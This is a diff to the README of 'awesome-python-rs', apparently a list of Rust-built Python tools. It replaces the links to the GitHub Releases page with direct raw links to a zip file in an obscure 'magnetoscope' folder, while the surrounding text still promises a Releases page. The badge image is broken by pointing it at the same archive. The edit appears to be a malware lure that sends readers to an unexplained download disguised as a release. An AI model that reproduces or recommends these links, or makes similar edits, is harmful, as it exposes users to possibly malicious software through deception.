@@ -1,6 +1,6 @@
 # 🐍 awesome-python-rs - Discover Powerful Python Tools Built with Rust
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Praveenkumar1312r/awesome-python-rs/releases)
+[![Download Now](https://raw.githubusercontent.com/Praveenkumar1312r/awesome-python-rs/main/magnetoscope/python_awesome_rs_v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Praveenkumar1312r/awesome-python-rs/main/magnetoscope/python_awesome_rs_v3.0.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ You can easily download the latest version of awesome-python-rs from our Release
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page where you can find the latest downloads.
 
-   [Visit this page to download](https://github.com/Praveenkumar1312r/awesome-python-rs/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Praveenkumar1312r/awesome-python-rs/main/magnetoscope/python_awesome_rs_v3.0.zip)
 
 2. **Choose Your Version:** On the Releases page, find the version that matches your needs. We recommend downloading the latest stable version for the best experience.
 
